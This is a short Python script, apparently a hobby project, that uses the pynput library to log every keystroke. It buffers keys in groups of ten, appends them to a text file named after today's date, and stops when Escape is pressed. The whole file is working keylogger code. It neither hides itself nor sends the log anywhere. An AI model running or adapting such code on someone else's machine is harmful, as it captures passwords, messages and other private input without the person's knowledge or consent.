import datetime
from pynput.keyboard import Key,Listener

#To get the filedate according to Date
date = datetime.date.today()
date = str(date)
######################################

count = 0
keys = []

#This Funcation : for Key Manage
def key_logg(key):
    global keys , count
    keys.append(key)
    count +=1
    if count >= 10 :
        count = 0
        save_key(keys)
        
        keys = []

#################################################



#This Function : for save the key in Text Field
def save_key(keys):
    with open(date+".txt", "a") as f:
        for key in keys:
            sv = str(key).replace("'","")
            if sv.find("space") > 0:
                f.write("\n")
            elif sv.find("Key") ==  -1:
                f.write(sv)

##################################################

# This Funcation : for Stop the Keylogger "ESC"
def key_stop(key):
    if key == Key.esc:
        return False
##################################################



with Listener(on_press=key_logg, on_release=key_stop) as listener:
    listener.join()
